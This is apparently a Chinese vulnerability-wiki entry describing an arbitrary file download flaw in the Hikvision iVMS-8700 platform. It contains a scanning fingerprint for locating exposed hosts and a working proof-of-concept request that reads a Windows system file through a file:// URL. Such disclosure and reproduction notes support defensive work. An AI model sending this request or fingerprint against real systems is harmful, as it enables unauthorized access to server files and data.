---
title: "Hikvision iVMS-8700综合安防管理平台 download 任意文件下载漏洞"
date: 2026-10-18 09:14:37
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "任意文件读取"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

Hikvision iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息

## 漏洞影响

Hikvision iVMS-8700综合安防管理平台

## 网络测绘

```
icon_hash="-911494769"
```

## 漏洞复现

登录页面

![image-20230704110859434](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704110859434.png)

验证POC， token 为 Url md5

```
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```

![image-20230704111021242](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704111021242.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
